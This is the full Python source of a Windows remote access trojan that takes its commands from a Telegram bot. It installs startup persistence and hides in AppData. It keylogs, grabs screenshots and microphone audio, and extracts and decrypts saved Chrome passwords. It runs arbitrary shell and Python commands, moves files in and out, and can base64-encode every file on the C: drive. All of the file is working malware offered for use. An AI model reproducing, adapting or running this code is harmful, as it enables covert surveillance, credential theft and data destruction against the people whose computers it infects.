#!/usr/bin/env python
# -*- coding: utf-8 -*-
import logging
from PIL import ImageGrab 								# /capture_pc
from shutil import copyfile, copyfileobj, rmtree, move 	# /ls, /pwd, /cd, /copy, /mv
from sys import argv, path, stdout 						# console output
from json import loads 									# reading json from ipinfo.io
from winshell import startup 							# persistence
from tendo import singleton								# this makes the application exit if there's another instance already running
from win32com.client import Dispatch					# WScript.Shell
from time import strftime, sleep
from subprocess import Popen, PIPE						# /cmd_exec					
import psutil											# updating	
import win32clipboard                                   # register clipboard    
import sqlite3											# get chrome passwords
import win32crypt										# get chrome passwords
import base64											# /encrypt_all
import datetime											# /schedule
import time
import threading 										# /proxy, /schedule
import proxy
import pyaudio, wave 									# /hear
import telepot, requests 								# telepot => telegram, requests => file download
from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
import os, os.path, platform, ctypes
import pyHook, pythoncom 								# keylogger
import socket											# internal IP
import getpass											# get username
import collections
import urllib# wallpaper

me = singleton.SingleInstance()
# REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
#token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll'
token = os.environ['RAT_TOKEN'] 						# you can set your environment variable as well
# This will be used for setting paths and related file io -- change to whatever you want
app_name = 'Portal'
# ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
known_ids = []
#known_ids.append(os.environ['TELEGRAM_CHAT_ID']if 'TELEGRAM_CHAT_ID' in os.environ) 		# make sure to remove this line if you don't have this environment variable
appdata_roaming_folder = os.environ['APPDATA']			# = 'C:\Users\Username\AppData\Roaming'
														# HIDING OPTIONS
														# ---------------------------------------------
hide_folder = appdata_roaming_folder + '\\' + app_name	# = 'C:\Users\Username\AppData\Roaming\Portal'
compiled_name = app_name + '.exe'						# Name of compiled .exe to hide in hide_folder, i.e 'C:\Users\Username\AppData\Roaming\Portal\portal.exe'
														# ---------------------------------------------
target_shortcut = startup() + '\\' + compiled_name.replace('.exe', '.lnk')
if not os.path.exists(hide_folder):
	os.makedirs(hide_folder)
	hide_compiled = hide_folder + '\\' + compiled_name
	copyfile(argv[0], hide_compiled)
	shell = Dispatch('WScript.Shell')
	shortcut = shell.CreateShortCut(target_shortcut)
	shortcut.Targetpath = hide_compiled
	shortcut.WorkingDirectory = hide_folder
	shortcut.save()
destroy = False
keyboardFrozen = False
mouseFrozen = False
curr_window = None
user = os.environ.get("USERNAME")	# Windows username to append keylogs
schedule = {}
log_file = hide_folder + '\\.user'
with open(log_file, "a") as writing:
	writing.write("-------------------------------------------------\n")
	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n\n")
logging.basicConfig(filename=log_file,level=logging.DEBUG)
def encode(file):
	f = open(file)
	data = f.read()
	f.close()
	encodedBytes = base64.b64encode(data)
	#remove old file
	os.remove(file)
	#tag new file
	file = file + '.nxr'
	t = open(file, "w+")
	t.write(encodedBytes)
	t.close()
	
def decode(file):
	f = open(file)
	data = f.read()
	f.close()
	decodedBytes = base64.b64decode(data)
	#remove old file
	os.remove(file)
	#tag new file
	file = file.replace('.nxr', '')
	t = open(file, "w+")
	t.write(decodedBytes)
	t.close()
	
def runStackedSchedule(everyNSeconds):
	for k in schedule.keys():
		if k < datetime.datetime.now():
			handle(schedule[k])
			del schedule[k]
	threading.Timer(everyNSeconds, runStackedSchedule).start()
	
def internalIP():
	internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	internal_ip.connect(('google.com', 0))
	return internal_ip.getsockname()[0]
	
def checkchat_id(chat_id):
	return len(known_ids) == 0 or str(chat_id) in known_ids
def get_curr_window():
		user32 = ctypes.windll.user32
		kernel32 = ctypes.windll.kernel32
		hwnd = user32.GetForegroundWindow()
		pid = ctypes.c_ulong(0)
		user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
		process_id = "%d" % pid.value
		executable = ctypes.create_string_buffer("\x00" * 512)
		h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
		ctypes.windll.psapi.GetModuleBaseNameA(h_process, None, ctypes.byref(executable), 512)
		window_title = ctypes.create_string_buffer("\x00" * 512)
		length = user32.GetWindowTextA(hwnd, ctypes.byref(window_title), 512)
		pid_info = "\n[ PID %s - %s - %s ]" % (process_id, executable.value, window_title.value)
		kernel32.CloseHandle(hwnd)
		kernel32.CloseHandle(h_process)
		return pid_info
	
def pressed_chars(event):
	data = None
	global curr_window
	if event.WindowName != curr_window:
		curr_window = event.WindowName
		fp = open(log_file, 'a')
		data = get_curr_window()
		fp.write(data + "\n")
		fp.close()
	if event and type(event.Ascii) == int:
		f = open(log_file,"a")
		if len(event.GetKey()) > 1:
			tofile = '<'+event.GetKey()+'>'
		else:
			tofile = event.GetKey()
		if tofile == '<Return>':
			print tofile
		else:
			stdout.write(tofile)
		f.write(tofile)
		f.close()
	return not keyboardFrozen
	# if event.Ascii > 32 and event.Ascii < 127:
		# fp = open(log_file, 'a')
		# data = chr(event.Ascii)
		# fp.write(data)
		# fp.close()
	# else:
		# while event.Key == "Lcontrol" or "Rcontrol" and event.Key == "A":
			# fp = open(log_file, 'a')
			# fp.write("[SELECT-ALL]")
			# fp.close()
			# break
		# while event.Key == "Lcontrol" or "Rcontrol" and event.Key == "C":
			# fp = open(log_file, 'a')
			# fp.write("[COPY]")
			# fp.close()
			# break
		# while event.Key == "Lcontrol" or "Rcontrol" and event.Key == "V":
			# win32clipboard.OpenClipboard()
			# try:
				# data = "\n[PASTE] - %s\n" % win32clipboard.GetClipboardData()
			# except TypeError:
				# pass
			# win32clipboard.CloseClipboard()
			# fp = open(log_file, 'a')
			# fp.write(data)
			# fp.close()
			# break
		# if event.Key == "Lshift" or "Rshift" or "Return" or "Back":
			# fp = open(log_file, 'a')
			# data = "[%s]" % event.Key
			# fp.write(data)
			# fp.close()
		# else:
			# fp = open(log_file, 'a')
			# data = "\n[%s]\n" % event.Key
			# fp.write(data)
			# fp.close()
		# return not keyboardFrozen
	
def split_string(n, st):
	lst = ['']
	for i in str(st):
		l = len(lst) - 1
		if len(lst[l]) < n:
			lst[l] += i
		else:
			lst += [i]
	return lst
	
def send_safe_message(bot, chat_id, message):
	while(True):
		try:
			print bot.sendMessage(chat_id, message)
			break
		except:
			pass
	
def handle(msg):
	chat_id = msg['chat']['id']
        if checkchat_id(chat_id):
                response = ''
                if 'text' in msg:
                        print '\n\t\tGot message from ' + str(chat_id) + ': ' + msg['text'] + '\n\n'
                        command = msg['text']
                        if command == '/arp':
                                response = ''
                                bot.sendChatAction(chat_id, 'typing')
                                lines = os.popen('arp -a -N ' + internalIP())
                                for line in lines:
                                        line.replace('\n\n', '\n')
                                        response += line
                        elif command == '/capture_pc':
                                bot.sendChatAction(chat_id, 'typing')
                                screenshot = ImageGrab.grab()
                                screenshot.save('screenshot.jpg')
                                bot.sendChatAction(chat_id, 'upload_photo')
                                bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
                                os.remove('screenshot.jpg')
                        elif command.startswith('/cmd_exec'):
                                process = Popen(['cmd'], stdin=PIPE, stdout=PIPE)
                                command = command.replace('/cmd_exec', '')
                                if len(command) > 1:
                                        process.stdin.write(bytes(command + '\n'))
                                        process.stdin.close()
                                        lines = process.stdout.readlines()
                                        for l in lines:
                                                response += l
                                else:
                                        response = '/cmd_exec dir'
                        elif command.startswith('/cd'):
                                command = command.replace('/cd ','')
                                try:
                                        os.chdir(command)
                                        response = os.getcwd() + '>'
                                except:
                                        response = 'No subfolder matching ' + command
                        elif command.startswith('/delete'):
                                command = command.replace('/delete', '')
                                path_file = command.strip()
                                try:
                                        os.remove(path_file)
                                        response = 'Succesfully removed file'
                                except:
                                        try:
                                                os.rmdir(path_file)
                                                response = 'Succesfully removed folder'
                                        except:
                                                try:
                                                        shutil.rmtree(path_file)
                                                        response = 'Succesfully removed folder and it\'s files'
                                                except:
                                                        response = 'File not found'
                        elif command == '/dns':
                                bot.sendChatAction(chat_id, 'typing')
                                lines = os.popen('ipconfig /displaydns')
                                for line in lines:
                                        line.replace('\n\n', '\n')
                                        response += line
                        elif command.startswith('/download'):
                                bot.sendChatAction(chat_id, 'typing')
                                path_file = command.replace('/download', '')
                                path_file = path_file[1:]
                                if path_file == '':
                                        response = '/download C:/path/to/file.name or /download file.name'
                                else:
                                        bot.sendChatAction(chat_id, 'upload_document')
                                        try:
                                                bot.sendDocument(chat_id, open(path_file, 'rb'))
                                        except:
                                                try:
                                                        bot.sendDocument(chat_id, open(hide_folder + '\\' + path_file))
                                                        response = 'Found in hide_folder: ' + hide_folder
                                                except:
                                                        response = 'Could not find ' + path_file
                        elif command.endswith('code_all'):
                                parentDirectory = 'C:\\'
                                for root, dirs, files in os.walk(parentDirectory):
                                        for afile in files:
                                                full_path = os.path.join(root, afile)
                                                if command.startswith('/en'):
                                                        encode(full_path)
                                                elif command.startswith('/de') and full_path.endswith('.nxr'):#our extension (been encoded)
                                                        decode(full_path)
                                response = 'Files ' + command[1:3] + 'coded succesfully.'
                        elif command.startswith('/cp'):
                                command = command.replace('/cp', '')
                                command = command.strip()
                                if len(command) > 0:
                                        try:
                                                file1 = command.split('"')[1];
                                                file2 = command.split('"')[3];
                                                copyfile(file1, file2)
                                                response = 'Files copied succesfully.'
                                        except Exception as e:
                                                response = 'Error: \n' + str(e)
                                else:
                                        response = 'Usage: \n/cp "C:/Users/DonaldTrump/Desktop/porn.jpg" "C:/Users/DonaldTrump/AppData/Roaming/Microsoft Windows/[pornography.jpg]"'
                                        response += '\n\nDouble-Quotes are needed in both whitespace-containing and not containing path(s)'
                        elif command.endswith('freeze_keyboard'):
                                global keyboardFrozen
                                keyboardFrozen = not command.startswith('/un')
                                hookManager.KeyAll = lambda event: not keyboardFrozen
                                response = 'Keyboard is now '
                                if keyboardFrozen:
                                        response += 'disabled. To enable, use /unfreeze_keyboard'
                                else:
                                        response += 'enabled'
                        elif command.endswith('freeze_mouse'):
                                global mouseFrozen
                                mouseFrozen = not command.startswith('/un')
                                hookManager.MouseAll = lambda event: not mouseFrozen
                                hookManager.HookMouse()
                                response = 'Mouse is now '
                                if mouseFrozen:
                                        response += 'disabled. To enable, use /unfreeze_mouse'
                                else:
                                        response += 'enabled'
                        elif command == '/get_chrome':
                                # """
                                __author__ = "Matan"
                                __version__ = "1.0.0"
                                __maintainer__ = "http://www.hackil.co.il"
                                con = sqlite3.connect(os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data')
                                cursor = con.cursor()
                                cursor.execute("SELECT origin_url,username_value,password_value from logins;")
                                for users in cursor.fetchall():
                                        response += 'Website: ' + users[0] + '\n'
                                        response += 'Username: ' + users[1] + '\n'
                                        response += 'Password: ' + str(win32crypt.CryptUnprotectData(users[2], None, None, None, 0)) + '\n\n'
                                # """
                                # pass
                        elif command.startswith('/hear'):
                                SECONDS = -1
                                try:
                                        SECONDS = int(command.replace('/hear','').strip())
                                except:
                                        SECONDS = 5
                                 
                                CHANNELS = 2
                                CHUNK = 1024
                                FORMAT = pyaudio.paInt16
                                RATE = 44100
                                 
                                audio = pyaudio.PyAudio()
                                bot.sendChatAction(chat_id, 'typing')
                                stream = audio.open(format=FORMAT, channels=CHANNELS,
                                                                rate=RATE, input=True,
                                                                frames_per_buffer=CHUNK)
                                frames = []
                                for i in range(0, int(RATE / CHUNK * SECONDS)):
                                        data = stream.read(CHUNK)
                                        frames.append(data)
                                stream.stop_stream()
                                stream.close()
                                audio.terminate()
                                
                                wav_path = hide_folder + '\\mouthlogs.wav'
                                waveFile = wave.open(wav_path, 'wb')
                                waveFile.setnchannels(CHANNELS)
                                waveFile.setsampwidth(audio.get_sample_size(FORMAT))
                                waveFile.setframerate(RATE)
                                waveFile.writeframes(b''.join(frames))
                                waveFile.close()
                                bot.sendChatAction(chat_id, 'upload_document')
                                bot.sendAudio(chat_id, audio=open(wav_path, 'rb'))
                        elif command == '/ip_info':
                                bot.sendChatAction(chat_id, 'find_location')
                                info = requests.get('http://ipinfo.io').text #json format
                                location = (loads(info)['loc']).split(',')
                                bot.sendLocation(chat_id, location[0], location[1])
                                import string
                                import re
                                response = 'External IP: ' 
                                response += "".join(filter(lambda char: char in string.printable, info))
                                response = re.sub('[:,{}\t\"]', '', response)
                                response += '\n' + 'Internal IP: ' + '\n\t' + internalIP()
                        elif command == '/keylogs':
                                bot.sendChatAction(chat_id, 'upload_document')
                                bot.sendDocument(chat_id, open(log_file, "rb"))
                        elif command.startswith('/ls'):
                                bot.sendChatAction(chat_id, 'typing')
                                command = command.replace('/ls', '')
                                command = command.strip()
                                files = []
                                if len(command) > 0:
                                        files = os.listdir(command)
                                else:
                                        files = os.listdir(os.getcwd())
                                human_readable = ''
                                for file in files:
                                        human_readable += file + '\n'
                                response = human_readable
                        elif command.startswith('/msg_box'):
                                message = command.replace('/msg_box', '')
                                if message == '':
                                        response = '/msg_box yourText'
                                else:
                                        ctypes.windll.user32.MessageBoxW(0, message, u'Information', 0x40)
                                        response = 'MsgBox displayed'
                        elif command.startswith('/mv'):
                                command = command.replace('/mv', '')
                                if len(command) > 0:
                                        try:
                                                file1 = command.split('"')[1];
                                                file2 = command.split('"')[3];
                                                move(file1, file2)
                                                response = 'Files moved succesfully.'
                                        except Exception as e:
                                                response = 'Error: \n' + str(e)
                                else:
                                        response = 'Usage: \n/mv "C:/Users/DonaldTrump/Desktop/porn.jpg" "C:/Users/DonaldTrump/AppData/Roaming/Microsoft Windows/[pornography.jpg]"'
                                        response += '\n\nDouble-Quotes are needed in both whitespace-containing and not containing path(s)'
                        elif command == '/pc_info':
                                bot.sendChatAction(chat_id, 'typing')
                                info = ''
                                for pc_info in platform.uname():
                                        info += '\n' + pc_info
                                info += '\n' + 'Username: ' + getpass.getuser()
                                response = info
                        elif command == '/ping':
                                response = platform.uname()[1] + ': I\'m up'
                        elif command.startswith('/play'):
                                command = command.replace('/play', '')
                                command = command.strip()
                                if len(command) > 0:
                                        systemCommand = 'start \"\" \"https://www.youtube.com/embed/'
                                        systemCommand += command
                                        systemCommand += '?autoplay=1&showinfo=0&controls=0\"'
                                        if os.system(systemCommand) == 0:
                                                response = 'YouTube video is now playing'
                                        else:
                                                response = 'Failed playing YouTube video'
                                else:
                                        response = '/play <VIDEOID>\n/play A5ZqNOJbamU'
                        elif command == '/proxy':
                                threading.Thread(target=proxy.main).start()
                                info = requests.get('http://ipinfo.io').text #json format
                                ip = (loads(info)['ip'])
                                response = 'Proxy succesfully setup on ' + ip + ':8081'
                        elif command == '/pwd':
                                response = os.getcwd()
                        elif command.startswith('/python_exec'):
                                command = command.replace('/python_exec','').strip()
                                if len(command) == 0:
                                        response = 'Usage: /python_exec print(\'printing\')'
                                else:
                                        from StringIO import StringIO
                                        import sys
                                        old_stderr = sys.stderr
                                        old_stdout = sys.stdout
                                        sys.stderr = mystderr = StringIO()
                                        sys.stdout = mystdout = StringIO()
                                        exec command in globals()
                                        if mystderr.getvalue() != None:
                                                response += mystderr.getvalue()
                                        if mystdout.getvalue() != None:
                                                response += mystdout.getvalue()	
                                        sys.stderr = old_stderr
                                        sys.stdout = old_stdout
                                        if response == '':
                                                response = 'Expression executed. No return or malformed expression.'
                        elif command == '/reboot':
                                bot.sendChatAction(chat_id, 'typing')
                                command = os.popen('shutdown /r /f /t 0')
                                response = 'Computer will be restarted NOW.'
                        elif command.startswith('/run'):
                                bot.sendChatAction(chat_id, 'typing')
                                path_file = command.replace('/run', '')
                                path_file = path_file[1:]
                                if path_file == '':
                                        response = '/run_file C:/path/to/file'
                                else:
                                        try:
                                                os.startfile(path_file)
                                                response = 'File ' + path_file + ' has been run'
                                        except:
                                                try:
                                                        os.startfile(hide_folder + '\\' + path_file)
                                                        response = 'File ' + path_file + ' has been run from hide_folder'
                                                except:
                                                        response = 'File not found'
                        elif command.startswith('/schedule'):
                                command = command.replace('/schedule', '')
                                if command == '':
                                        response = '/schedule 2017 12 24 23 59 /msg_box happy christmas'
                                else:
                                        scheduleDateTimeStr = command[1:command.index('/') - 1]
                                        scheduleDateTime = datetime.datetime.strptime(scheduleDateTimeStr, '%Y %m %d %H %M')
                                        scheduleMessage = command[command.index('/'):]
                                        schedule[scheduleDateTime] = {'text' : scheduleMessage, 'chat' : { 'id' : chat_id }}
                                        response = 'Schedule set: ' + scheduleMessage
                                        runStackedSchedule(10)
                        elif command == '/self_destruct':
                                bot.sendChatAction(chat_id, 'typing')
                                global destroy
                                destroy = True
                                response = 'You sure? Type \'/destroy\' to proceed.'
                        elif command == '/shutdown':
                                bot.sendChatAction(chat_id, 'typing')
                                command = os.popen('shutdown /s /f /t 0')
                                response = 'Computer will be shutdown NOW.'
                        elif command == '/destroy' and destroy == True:
                                bot.sendChatAction(chat_id, 'typing')
                                if os.path.exists(hide_folder):
                                        rmtree(hide_folder)
                                if os.path.isfile(target_shortcut):
                                        os.remove(target_shortcut)
                                os._exit(0)
                        elif command == '/tasklist':
                                lines = os.popen('tasklist /FI \"STATUS ne NOT RESPONDING\"')
                                response2 = ''
                                for line in lines:
                                        line.replace('\n\n', '\n')
                                        if len(line)>2000:
                                                response2 +=line
                                        else:
                                                response += line
                                response += '\n' + response2
                        elif command.startswith('/to'):
                                command = command.replace('/to','')
                                import winsound
                                winsound.Beep(440, 300)
                                if command == '':
                                        response = '/to <COMPUTER_1_NAME>, <COMPUTER_2_NAME> /msg_box Hello HOME-PC and WORK-PC'
                                else:
                                        targets = command[:command.index('/')]
                                        if platform.uname()[1] in targets:
                                                command = command.replace(targets, '')
                                                msg = {'text' : command, 'chat' : { 'id' : chat_id }}
                                                handle(msg)
                        elif command == '/update':
                                proc_name = app_name + '.exe'
                                if not os.path.exists(hide_folder + '\\updated.exe'):
                                        response = 'Send updated.exe first.'
                                else:
                                        for proc in psutil.process_iter():
                                                # check whether the process name matches
                                                if proc.name() == proc_name:
                                                        proc.kill()
                                        os.rename(hide_folder + '\\' + proc_name, hide_folder + '\\' + proc_name + '.bak')
                                        os.rename(hide_folder + '\\updated.exe', hide_folder + '\\' + proc_name)
                                        os.system(hide_folder + '\\' + proc_name)
                                        sys.exit()
                        elif command.startswith('/wallpaper'):
                                command = command.replace('/wallpaper', '')
                                command = command.strip()
                                if len(command) == 0:
                                        response = 'Usage: /wallpaper C:/Users/User/Desktop/porn.jpg'
                                elif command.startswith('http'):
                                        image = command.rsplit('/',1)[1]
                                        image = hide_folder + '/' + image
                                        urllib.urlretrieve(command, image)
                                        ctypes.windll.user32.SystemParametersInfoW(20, 0, image, 3)
                                else:
                                        ctypes.windll.user32.SystemParametersInfoW(20, 0, command.replace('/', '//'), 3)
                                        response = 'Wallpaper succesfully set.'
                        elif command == '/help':
                                # functionalities dictionary: command:arguments
                                functionalities = { '/arp' : '', \
                                                '/capture_pc' : '', \
                                                '/cmd_exec' : '<command_chain>', \
                                                '/cd':'<target_dir>', \
                                                '/decode_all':'', \
                                                '/delete':'<target_file>', \
                                                '/dns':'', \
                                                '/download':'<target_file>', \
                                                '/encode_all':'', \
                                                '/freeze_keyboard':'', \
                                                '/freeze_mouse':'', \
                                                '/get_chrome':'', \
                                                '/hear':'[time in seconds, default=5s]', \
                                                '/ip_info':'', \
                                                '/keylogs':'', \
                                                '/ls':'[target_folder]', \
                                                '/msg_box':'<text>', \
                                                '/pc_info':'', \
                                                '/play':'<youtube_videoId>', \
                                                '/proxy':'', \
                                                '/pwd':'', \
                                                '/python_exec':'<command_chain>', \
                                                '/reboot':'', \
                                                '/run':'<target_file>', \
                                                '/self_destruct':'', \
                                                '/shutdown':'', \
                                                '/tasklist':'', \
                                                '/to':'<target_computer>, [other_target_computer]',\
                                                '/update':'',\
                                                '/wallpaper':'<target_file>'}
                                response = "\n".join(command + ' ' + description for command,description in sorted(functionalities.items()))
                        else: # redirect to /help
                                msg = {'text' : '/help', 'chat' : { 'id' : chat_id }}
                                handle(msg)
                else: # Upload a file to target
                        file_name = ''
                        file_id = None
                        if 'document' in msg:
                                file_name = msg['document']['file_name']
                                file_id = msg['document']['file_id']
                        elif 'photo' in msg:
                                file_time = int(time.time())
                                file_id = msg['photo'][1]['file_id']
                                file_name = file_id + '.jpg'
                        file_path = bot.getFile(file_id=file_id)['file_path']
                        link = 'https://api.telegram.org/file/bot' + str(token) + '/' + file_path
                        file = (requests.get(link, stream=True)).raw
                        with open(hide_folder + '\\' + file_name, 'wb') as out_file:
                                copyfileobj(file, out_file)
                        response = 'File saved as ' + file_name
                if response != '':
                        responses = split_string(4096, response)
                        for resp in responses:
                                send_safe_message(bot, chat_id, resp)#
bot = telepot.Bot(token)
bot.message_loop(handle)
if len(known_ids) > 0:
	helloWorld = platform.uname()[1] + ": I'm up."
	for known_id in known_ids:
		send_safe_message(bot, known_id, helloWorld)
	print helloWorld
print 'Listening for commands on ' + platform.uname()[1] + '...'
hookManager = pyHook.HookManager()
hookManager.KeyDown = pressed_chars
hookManager.HookKeyboard()
pythoncom.PumpMessages()
